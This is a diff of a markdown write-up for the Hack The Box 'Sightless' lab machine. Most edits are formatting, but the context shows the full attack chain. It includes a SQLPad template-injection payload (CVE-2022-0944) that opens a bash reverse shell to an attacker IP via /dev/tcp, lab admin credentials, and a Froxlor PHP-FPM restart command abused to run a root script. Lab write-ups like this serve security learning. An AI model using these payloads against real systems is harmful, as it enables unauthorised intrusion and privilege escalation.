@@ -8,7 +8,8 @@ comments: false
 
 The Sightless HTB machine was compromised through a SQLPad RCE vulnerability (CVE-2022-0944), which allowed initial access as root within a docker container. After pivoting to a user account via cracked credentials, the machine was fully rooted by exploiting a Froxlor RCE vulnerability accessed through port forwarding and a Chrome Debugger exploit
 
-## Common Enumeration 
+## Common Enumeration
+
 ### Nmap
 
 I fired up `nmap` for a full port scan: `sudo nmap -p- -sC -sV -oA recon/allports 10.10.11.32 --open`. As always I throw in the `-sC` for default scripts and `-sV` for version detection
@@ -52,9 +53,13 @@ Nmap done: 1 IP address (1 host up) scanned in 75.54 seconds
 ```
 
 The HTTP web server was redirecting to `http://sightless.htb/`, so I went ahead and added that to my `/etc/hosts`
+
 ### FTP - 21
+
 Okay, so FTP on port 21 was open, but when I tried to log in anonymously, it was a dead end
+
 ### Directory Brute Forcing and Fuzzing
+
 #### Gobuster
 
 I used `gobuster` - with a common wordlist to check for hidden directories. The results? - Nothing exciting
@@ -88,7 +93,7 @@ Finished
 
 I also tried some fuzzing with `ffuf` Unfortunately, it came up empty
 
-```
+```bash
 $ ffuf -u http://10.10.11.32 -H "Host: FUZZ.sightless.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac
 
         /'___\  /'___\           /'___\
@@ -117,7 +122,7 @@ ________________________________________________
 
 ### Browsing Website
 
-Navigating to `https://sightless.htb/` led to the following home page noting interesting... 
+Navigating to `https://sightless.htb/` led to the following home page noting interesting...
 
 ![img](/assets/img/Sightless/1.webp)
 
@@ -126,6 +131,7 @@ Under the "Our Services" section, the "Start Now" button had a hyperlink to a su
 ![img](/assets/img/Sightless/2.webp)
 
 I added `sqlpad.sightless.htb` to my `/etc/hosts`
+
 ## SQLPad
 
 Navigating to `http://sqlpad.sightless.htb/` brought me to the SQLPad queries page
@@ -137,6 +143,7 @@ It didn’t seem like there was much I could do here. I checked the "About" sect
 ![img](/assets/img/Sightless/4.webp)
 
 A quick Google search for "SQLPad 6.10.0 exploit" led me to [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944) which is a template injection vulnerability that could lead to Remote Code Execution (RCE). Jackpot!
+
 ### CVE-2022-0944
 
 I found a Proof of Concept (PoC) from [huntr](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb) Here's how I used it
@@ -146,7 +153,7 @@ I found a Proof of Concept (PoC) from [huntr](https://huntr.com/bounties/4663072
 - Input the following payload into the Database form field
 - Modified the Payload
 
-```bash
+```php
 "{{ process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.54/1337 0>&1\"') }}"
 ```
 
@@ -169,6 +176,7 @@ whoami
 root
 root@c184118df0a6:/var/lib/sqlpad#
 ```
+
 ## Initial Access
 
 Alright, so I was in as root but it was inside a Docker container time to do some recon
@@ -388,6 +396,7 @@ john        1598  0.3  0.3 33630172 14928 ?      Sl   Jan10   3:40 /home/john/au
 john        1603  0.0  0.0      0     0 ?        Z    Jan10   0:00 [chromedriver] <defunct>
 ...snip...
 ```
+
 ### Port forwarding - (47457, 39559, 43399)
 
 Again, I set up port forwarding using SSH
@@ -412,7 +421,9 @@ On `index.php`, I found the admin credentials as part of the payload!
 loginname: admin
 password: ForlorfroxAdmin
 ```
+
 ## Privilege Escalation
+
 ### Login to Froxlor as Admin
 
 With the credentials `admin:ForlorfroxAdmin`, I went back to the Froxlor login page, and I was in!
@@ -433,9 +444,10 @@ Then, I navigated to `PHP` -> `PHP-FPM versions` and clicked on "Create new PHP 
 ![img](/assets/img/Sightless/10.webp)
 
 I added the following
-	- Short description: `RCE`
-	- php-fpm restart command: `/bin/bash /dev/shm/rce.sh`
-	- Clicked `Save`
+
+- Short description: `RCE`
+- php-fpm restart command: `/bin/bash /dev/shm/rce.sh`
+- Clicked `Save`
 
 ![img](/assets/img/Sightless/11.webp)
 
@@ -464,4 +476,3 @@ root.txt
 ```text
 87e3fe8cf...
 ```
-
